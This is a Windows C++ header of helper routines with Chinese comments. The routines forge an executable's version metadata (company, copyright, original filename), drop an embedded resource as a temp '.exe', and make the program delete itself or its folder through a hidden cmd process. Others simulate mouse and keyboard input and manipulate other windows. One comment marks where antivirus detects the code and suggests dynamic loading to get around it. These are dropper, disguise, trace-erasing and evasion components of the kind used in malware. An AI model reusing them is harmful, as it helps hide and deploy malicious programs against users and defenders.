
#pragma once
#include "tchar.h"
#include <string>
#include "Shlobj.h"

#pragma  comment(lib, "Version.lib")

//msdn中有12种产品的信息
typedef struct _ATTINFO
{
	std::wstring wsFilePath;		//待修改的文件路径
	std::wstring swCompanyName;		//公司名
	std::wstring swVersion;			//文件版本，产品版本
	std::wstring wsComments;		//描述
	std::wstring wsOriginalFilename;//原始名
	std::wstring wsLegalCopyright;	//版权信息
}ATTINFO, *PATTINFO;

// these macros help to align on r-byte boundaries (thanks Ted Peck)
#define roundoffs(a,b,r) (((BYTE *) (b) - (BYTE *) (a) + ((r) - 1)) & ~((r) - 1))
#define roundpos(a,b,r) (((BYTE *) (a)) + roundoffs(a,b,r))


struct VS_VERSIONINFO
{
	WORD                wLength;
	WORD                wValueLength;
	WORD                wType;
	WCHAR               szKey[1];
	WORD                wPadding1[1];
	VS_FIXEDFILEINFO    Value;
	WORD                wPadding2[1];
	WORD                wChildren[1];
};

struct
{
	WORD wLanguage;
	WORD wCodePage;
} *lpTranslate;

//1.0.3.7
typedef struct _Version
{
	DWORD dwVersionMS;  //high version 1.0
	DWORD dwVersionLS;  //low version  3.7
}VERSION_NUM;

//Get version number from string
void GetVersionFromString(std::wstring wsVersion, VERSION_NUM& varVersion)
{
	int iTmp = 0;
	int iStart = 0;
	int iEnd = wsVersion.find(_T('.'));
	std::wstring wsNum = wsVersion.substr(0, iEnd - iStart);
	int iOne = _wtoi(wsNum.c_str());
	iStart = iEnd + 1;

	iEnd = wsVersion.find(_T('.'), iStart);
	wsNum = wsVersion.substr(iStart, iEnd- iStart);
	int iTwo = _wtoi(wsNum.c_str());
	iStart = iEnd + 1;

	iEnd = wsVersion.find(_T('.'), iStart);
	wsNum = wsVersion.substr(iStart, iEnd- iStart);
	int iThree = _wtoi(wsNum.c_str());
	iStart = iEnd + 1;

	wsNum = wsVersion.substr(iStart, wsVersion.length() - iStart);
	int iFour = _wtoi(wsNum.c_str());

	iOne = iOne << 16;
	varVersion.dwVersionMS = iOne | iTwo;

	iThree = iThree << 16;
	varVersion.dwVersionLS = iThree | iFour;
}

void ChangeBuffer(LPTSTR lpBuf, std::wstring& strValue)
{
	if (!strValue.empty())
	{
		_tcscpy_s(lpBuf, strValue.length()+1, strValue.c_str());
	}
}

void ModifyPEAttribute(ATTINFO& attinfo)
{
	VS_VERSIONINFO      *pVerInfo = NULL;
	LPBYTE              pOffsetBytes = NULL;
	VS_FIXEDFILEINFO    *pFixedInfo = NULL;
	LPCTSTR             lpszFile = attinfo.wsFilePath.c_str();  
	DWORD               dwHandle = 0;
	DWORD				dwSize = 0;
	DWORD				dwResult = 0;

	VERSION_NUM tmp;
	GetVersionFromString(attinfo.swVersion, tmp);
	dwSize = GetFileVersionInfoSize(lpszFile, &dwHandle);

	if (0 < dwSize)
	{
		LPBYTE lpBuffer = new BYTE[dwSize];

		if (GetFileVersionInfo(lpszFile, 0, dwSize, lpBuffer) != FALSE)
		{

			// 'point to' the start of the version information block
			pVerInfo = (VS_VERSIONINFO *) lpBuffer;

			// the fixed section starts right after the 'VS_VERSION_INFO' string
			pOffsetBytes = (BYTE *) &pVerInfo->szKey[_tcslen(pVerInfo->szKey) + 1];

			pFixedInfo = (VS_FIXEDFILEINFO *) roundpos(pVerInfo, pOffsetBytes, 4);

			// increment the numbers!
			pFixedInfo->dwFileVersionMS    = tmp.dwVersionMS; //pFixedInfo->dwFileVersionMS + 0x00010001;
			pFixedInfo->dwFileVersionLS    = tmp.dwVersionLS; //pFixedInfo->dwFileVersionLS + 0x00010001;
			pFixedInfo->dwProductVersionMS = tmp.dwVersionMS; //pFixedInfo->dwProductVersionMS + 0x00010001;  //internal version num
			pFixedInfo->dwProductVersionLS = tmp.dwVersionLS; //pFixedInfo->dwProductVersionLS + 0x00010001;

			HANDLE hResource = BeginUpdateResource(lpszFile, FALSE);
			if (NULL != hResource)
			{
				UINT uTemp;

				// get the language information
				if (VerQueryValue(lpBuffer, _T("\\VarFileInfo\\Translation"), (LPVOID *) &lpTranslate, &uTemp) != FALSE)
				{
					TCHAR strSubBlock[MAX_PATH] = {0};
					LPTSTR  pValueBuffer;


					//名称
					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\InternalName"), lpTranslate->wLanguage, lpTranslate->wCodePage);
					BOOL bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
					if (bRet == TRUE)
					{
						//pValueBuffer[0] = _T('a');
					}

					//文件描述
					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\FileDescription"),lpTranslate->wLanguage, lpTranslate->wCodePage);
					bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
					if (bRet == TRUE)
					{
						ChangeBuffer(pValueBuffer, attinfo.wsComments);
					}

					//产品名
					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\ProductName"), lpTranslate->wLanguage, lpTranslate->wCodePage);
					bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
					if (bRet == TRUE)
					{
						ChangeBuffer(pValueBuffer, attinfo.wsOriginalFilename);
					}

					//版权说明
					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\LegalCopyright"), lpTranslate->wLanguage, lpTranslate->wCodePage);
					bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
					if (bRet == TRUE)
					{
						ChangeBuffer(pValueBuffer, attinfo.wsLegalCopyright);
					}

					//原始名
					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\OriginalFilename"), lpTranslate->wLanguage, lpTranslate->wCodePage);
					bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
					if (bRet == TRUE)
					{
						ChangeBuffer(pValueBuffer, attinfo.wsOriginalFilename);
					}

					//产品版本
					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\ProductVersion"), lpTranslate->wLanguage, lpTranslate->wCodePage);
					bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
					if (bRet == TRUE)
					{
						ChangeBuffer(pValueBuffer, attinfo.swVersion);
					}

					//文件版本
					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\FileVersion"), lpTranslate->wLanguage, lpTranslate->wCodePage);
					bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
					if (bRet == TRUE)
					{
						ChangeBuffer(pValueBuffer, attinfo.swVersion);
					}

					//PrivateBuild版本
					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\SpecialBuild"), lpTranslate->wLanguage, lpTranslate->wCodePage);
					bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
					if (bRet == TRUE)
					{
						ChangeBuffer(pValueBuffer, attinfo.swVersion);
					}

					// could probably just use LANG_NEUTRAL/SUBLANG_NEUTRAL
					if (UpdateResource(hResource, RT_VERSION, MAKEINTRESOURCE(VS_VERSION_INFO), lpTranslate->wLanguage, lpBuffer, dwSize) != FALSE)
					{
						if (EndUpdateResource(hResource, FALSE) == FALSE)
							dwResult = GetLastError();
					}
					else
						dwResult = GetLastError();
				}
			}
			else
				dwResult = GetLastError();
		}
		else
			dwResult = GetLastError();

		delete [] lpBuffer;
	}
	else
		dwResult = GetLastError();

	if (0 != dwResult)
		wprintf(_T("Operation was not successful.  Result = %lu\n"), dwResult);
}

void ModifyPEAttEx(ATTINFO& attinfo)
{
	VS_VERSIONINFO      *pVerInfo = NULL;
	LPBYTE              pOffsetBytes = NULL;
	VS_FIXEDFILEINFO    *pFixedInfo = NULL;
	LPCTSTR             lpszFile = attinfo.wsFilePath.c_str();  
	DWORD               dwHandle = 0;
	DWORD				dwSize = 0;
	DWORD				dwResult = 0;


	FILE* pFile = NULL;
	_tfopen_s(&pFile, _T("version"), _T("rb"));
	fseek(pFile, 0, SEEK_END);
	int iLength = ftell(pFile); //文件长度
	fseek(pFile, 0, SEEK_SET);

	LPBYTE lpBuf = new BYTE[iLength];
	if (lpBuf == NULL)
	{
		fclose(pFile);
		return ;
	}
	memset(lpBuf, 0, iLength);
	fread(lpBuf, iLength, 1, pFile);
	fclose(pFile);

	LPBYTE lpBuffer = lpBuf;

	HANDLE hResource = BeginUpdateResource(lpszFile, FALSE);
	if (NULL != hResource)
	{
		UINT uTemp;

		// get the language information 修改版本
		if (VerQueryValue(lpBuffer, _T("\\VarFileInfo\\Translation"), (LPVOID *) &lpTranslate, &uTemp) != FALSE)
		{
			TCHAR strSubBlock[MAX_PATH] = {0};
			LPTSTR  pValueBuffer;
			//goto ENDPOS;
			//名称
			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\InternalName"),lpTranslate->wLanguage, lpTranslate->wCodePage);
			BOOL bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
			if (bRet == TRUE)
			{
				//pValueBuffer[0] = _T('a');
			}

			//文件描述
			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\FileDescription"),lpTranslate->wLanguage, lpTranslate->wCodePage);
			bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
			if (bRet == TRUE)
			{
				_tcscpy_s(pValueBuffer, attinfo.wsComments.length()+1, attinfo.wsComments.c_str());
			}

			//产品名
			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\ProductName"), lpTranslate->wLanguage, lpTranslate->wCodePage);
			bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
			if (bRet == TRUE)
			{
				_tcscpy_s(pValueBuffer, attinfo.wsOriginalFilename.length()+1, attinfo.wsOriginalFilename.c_str());
			}

			//版权说明
			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\LegalCopyright"), lpTranslate->wLanguage, lpTranslate->wCodePage);
			bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
			if (bRet == TRUE)
			{
				_tcscpy_s(pValueBuffer, attinfo.wsLegalCopyright.length()+1, attinfo.wsLegalCopyright.c_str());
			}

			//原始名
			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\OriginalFilename"), lpTranslate->wLanguage, lpTranslate->wCodePage);
			bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
			if (bRet == TRUE)
			{
				_tcscpy_s(pValueBuffer, attinfo.wsOriginalFilename.length()+1, attinfo.wsOriginalFilename.c_str());
			}

			//产品版本
			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\ProductVersion"), lpTranslate->wLanguage, lpTranslate->wCodePage);
			bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
			if (bRet == TRUE)
			{
				_tcscpy_s(pValueBuffer,  attinfo.swVersion.length()+1, attinfo.swVersion.c_str());
			}

			//文件版本
			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\FileVersion"), lpTranslate->wLanguage, lpTranslate->wCodePage);
			bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
			if (bRet == TRUE)
			{
				_tcscpy_s(pValueBuffer,  attinfo.swVersion.length()+1, attinfo.swVersion.c_str());
			}

			//PrivateBuild版本
			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\SpecialBuild"), lpTranslate->wLanguage, lpTranslate->wCodePage);
			bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
			if (bRet == TRUE)
			{
				_tcscpy_s(pValueBuffer,  attinfo.swVersion.length()+2, attinfo.swVersion.c_str());
			}

			// could probably just use LANG_NEUTRAL/SUBLANG_NEUTRAL
			if (UpdateResource(hResource, RT_VERSION, MAKEINTRESOURCE(VS_VERSION_INFO), lpTranslate->wLanguage, lpBuf, iLength) != FALSE)
			{
				if (EndUpdateResource(hResource, FALSE) == FALSE)
					dwResult |= GetLastError();
			}
			else
				dwResult |= GetLastError();
		}
	}
	else
		dwResult |= GetLastError();


	delete [] lpBuf;
	if (0 != dwResult)
		wprintf(_T("Operation was not successful.  Result = %lu\n"), dwResult);
}

void Build(LPCTSTR lpszFile)
{
	DWORD               dwHandle = 0;
	DWORD				dwSize = 0;
	dwSize = GetFileVersionInfoSize(lpszFile, &dwHandle);
	if (0 < dwSize)
	{
		LPBYTE lpBuffer = new BYTE[dwSize];
		if (GetFileVersionInfo(lpszFile, 0, dwSize, lpBuffer) != FALSE)
		{
			FILE* pFile = NULL;
			_tfopen_s(&pFile, _T("version"), _T("wb"));
			fwrite(lpBuffer, dwSize, 1, pFile);
			fclose(pFile);

			delete [] lpBuffer;
		}
	}
}

//将程序中的资源导出
bool GetResource(HINSTANCE hInstance, LPCTSTR lpFilePath)
{
	bool iRet = false;
	HRSRC hResInfo = ::FindResource(NULL, MAKEINTRESOURCE(0),_T("mttype"));
	HGLOBAL hRes = ::LoadResource(NULL, hResInfo);

	LPVOID Data = ::LockResource(hRes);   // 找到并锁定资源
	DWORD nSize = ::SizeofResource(hInstance, hResInfo);   	// 资源大小

	BYTE *pBuf = new BYTE[nSize];
	if(pBuf == NULL)
	{
		return FALSE;
	}
	memcpy(pBuf, Data, nSize);
	DeleteFile(lpFilePath);

	HANDLE hOptFile = ::CreateFile(lpFilePath, GENERIC_WRITE, 0, NULL,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOptFile == INVALID_HANDLE_VALUE) { return false; }
	DWORD written = 0;
	if (::WriteFile(hOptFile, pBuf, nSize, &written, NULL))  /*Features, winapi*/
	{
	 	iRet = true;
	}
	::CloseHandle(hOptFile);


	delete pBuf;
	return iRet;
}

//移动鼠标，模拟鼠标键盘操作
long MouseMove()
{
	SetCursorPos(20, 50);
	mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
	mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);

	return 0;
}


//自删除程序
void DeleteSelf(bool bIsDir)
{
	//
	SHELLEXECUTEINFO ExeInfo;
	TCHAR     ExePath[MAX_PATH] = {0};
	TCHAR     ParamPath[MAX_PATH] = {0};
	TCHAR     ComposePath[MAX_PATH] = {0};


	GetModuleFileName(NULL,ExePath,MAX_PATH);
	GetShortPathName(ExePath,ExePath,MAX_PATH);
	GetEnvironmentVariable(_T("COMSPEC"),ComposePath,MAX_PATH);

	if (bIsDir)
	{
		TCHAR *p=_tcsrchr(ExePath,_T('\\'));
		if(p!=NULL)
			p[1]=_T('\0');

		if (_tcslen(ExePath) < 4)
			return;

		_tcscpy_s(ParamPath,_T("/c rd \""));
		_tcscat_s(ParamPath,ExePath);
		_tcscat_s(ParamPath,_T("\" /S/Q"));

	}
	else
	{
		_tcscpy_s(ParamPath,_T("/c del "));
		_tcscat_s(ParamPath,ExePath);
		_tcscat_s(ParamPath,_T(" > nul"));
	}


	ZeroMemory(&ExeInfo,sizeof(ExeInfo));
	ExeInfo.cbSize = sizeof(ExeInfo);
	ExeInfo.hwnd = 0;  
	ExeInfo.lpVerb = _T("Open");    
	ExeInfo.lpFile = ComposePath;    
	ExeInfo.lpParameters = ParamPath; 
	ExeInfo.nShow = SW_HIDE;     
	ExeInfo.fMask = SEE_MASK_NOCLOSEPROCESS; 


	if (ShellExecuteEx(&ExeInfo))
	{

		SetPriorityClass(ExeInfo.hProcess,IDLE_PRIORITY_CLASS);
		//
		SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);
		//ͨ
		SHChangeNotify(SHCNE_DELETE,SHCNF_PATH,ExePath,NULL);
	}
}

//获得程序资源中的内容
DWORD GetSourceFromFile(HINSTANCE hInstance)
{
	bool iRet = false;
	HRSRC hResInfo = ::FindResource(NULL, MAKEINTRESOURCE(123/*IDC_MT_SOURCE*/),_T("mt"));
	HGLOBAL hRes = ::LoadResource(NULL, hResInfo);

	LPVOID Data = ::LockResource(hRes);   // 找到并锁定资源
	DWORD nSize = ::SizeofResource(hInstance, hResInfo);   	// 资源大小

	TCHAR lpTempPath[MAX_PATH] = {0};
	TCHAR tcsTmpFilePath[MAX_PATH] = {0};
	GetEnvironmentVariable(_T("TEMP"), lpTempPath, MAX_PATH);
	GetTempFileName(lpTempPath,_T("~dl"), 0, tcsTmpFilePath);
	_tcscat_s(tcsTmpFilePath, MAX_PATH, _T(".exe"));

	DeleteFile(tcsTmpFilePath);

	HANDLE hOptFile = ::CreateFile(tcsTmpFilePath, GENERIC_WRITE, 0, NULL,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOptFile == INVALID_HANDLE_VALUE) { return false; }
	DWORD written = 0;
	if (::WriteFile(hOptFile, Data, nSize, &written, NULL))  /*Features, winapi*/
	{
		iRet = true;
	}
	::CloseHandle(hOptFile);

	// 	if (WriteFile_DL(nSize, (LPBYTE)pBuf, tcsTmpFilePath))  /*Features报毒位置，动态加载*/
	// 	{
	// 		iRet = true;
	// 	}

	return iRet;
}

//获得设置窗口标题
//枚举子窗口用到的信息
typedef struct _WINDOWSINFO
{
	LPCTSTR lpChildClassName;
	LPCTSTR lpChileTitleName;
	LPCTSTR lpSetValue;   //设置的值
	LPTSTR  lpGetValue;   //获得的值
	int		iType;		  //1表示设置置，2表示获得值
}WINDOWSINFO, *LPWINDOWSINFIO;
#define GETVALUE	1
#define SETVALUE	2
LPCTSTR IsStringEmpty(std::wstring& strValue)
{
	if (!strValue.empty())
	{
		return strValue.c_str();
	}
	return NULL;
}
BOOL CALLBACK EnumChildProc(HWND hWnd,LPARAM lParam)  
{  
	WINDOWSINFO* lpWinInfo = (WINDOWSINFO*)lParam;
	TCHAR lpClassName[MAX_PATH] = {0};
	::GetClassName(hWnd, lpClassName, MAX_PATH);

	if (0 == _tcsicmp(lpClassName, lpWinInfo->lpChildClassName))
	{
		if (GETVALUE == lpWinInfo->iType)
		{
			SendMessage(hWnd, WM_GETTEXT, MAX_PATH, (LPARAM)lpWinInfo->lpGetValue);
		}
		else if (SETVALUE == lpWinInfo->iType)
		{
			SendMessage(hWnd, WM_SETTEXT, MAX_PATH, (LPARAM)lpWinInfo->lpSetValue);
		}
	}

	return true;  
}
long OpeWindowTextValue()
{
	std::wstring strParentClassName = _T("");
	std::wstring strParentTitleName = _T("");
	std::wstring strChildClassName = _T("");
	std::wstring strChildTitleName = _T("");
	std::wstring strValue = _T(""); 
	int iType = GETVALUE;

	LPCTSTR lpParentClassName = IsStringEmpty(strParentClassName);
	LPCTSTR lpParentTitleName = IsStringEmpty(strParentTitleName);
	LPCTSTR lpChildClassName = IsStringEmpty(strChildClassName);
	LPCTSTR lpChildTitleName = IsStringEmpty(strChildTitleName);

	HWND hwnd = ::FindWindow(lpParentClassName, lpParentTitleName);
	if (NULL == hwnd)
	{
		return 0;
	}

	TCHAR lpGetValue[MAX_PATH] = {0};
	WINDOWSINFO winInfo = {0};
	winInfo.lpChildClassName = lpChildClassName;
	winInfo.lpChileTitleName = lpChildTitleName;
	winInfo.lpSetValue = strValue.c_str();
	winInfo.lpGetValue = lpGetValue;
	winInfo.iType = iType;
	::EnumChildWindows(hwnd, EnumChildProc, LPARAM(&winInfo));

	if (GETVALUE == iType)
	{
	}

	DWORD dwRet = GetLastError();

	return 0;
}

//鼠标移动
DWORD OpeMouse()
{
	//设置鼠标位置
	SetCursorPos(0, 0);

	//获得鼠标位置
	POINT pos = {0};
	BOOL bRet = ::GetCursorPos(&pos);

	//鼠标点击
	mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
	mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);

	//键盘按键
	keybd_event(0x5B, 0, 0, 0);
	keybd_event(0x5B, 0, KEYEVENTF_KEYUP, 0);

	return 0;
}

//获得窗口的文字
DWORD GetWindowsString()
{
	std::wstring strClassName = _T("Classname");

	LPCTSTR lpClassName = IsStringEmpty(strClassName);

	HWND hwnd = ::FindWindow(lpClassName, NULL);
	if (NULL == hwnd)
	{
		return 0;
	}

	TCHAR lpText[MAX_PATH] = {0};
	GetWindowText(hwnd, lpText, MAX_PATH);


	//显示窗口
	//BOOL bSmall = IsIconic(hwnd);    //是否最小化
	//BOOL bSmall = IsZoomed(hwnd);	   //是否最大化
	ShowWindow(hwnd, SW_SHOWNORMAL);   //正常显示
	int iRet = SetForegroundWindow(hwnd) ;


	//关闭窗口
	BOOL bRet = ::PostMessage( hwnd, WM_CLOSE, 0, 0 );


	//获取某点的颜色
	HDC hDC = ::GetDC(NULL);
	COLORREF colorref = ::GetPixel(hDC, 123, 123);  //Get the cursor color
	::ReleaseDC(NULL,hDC);
	int r = (colorref&0xFF);
	int g = (colorref>>8)&0xFF;
	int b = (colorref>>16);

	return 0;
}

//窗口置顶
DWORD PutWindowtoFront()
{
	std::wstring strClassName = _T("classname");
	std::wstring strTitleName = _T("titlename");

	LPCTSTR lpClassName = IsStringEmpty(strClassName);
	LPCTSTR lpTitleName = IsStringEmpty(strTitleName);

	HWND hwnd = ::FindWindow(lpClassName, lpTitleName);
	if (NULL == hwnd)
	{
		return 0;
	}

	::SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE|SWP_NOSIZE);
	return 0;
}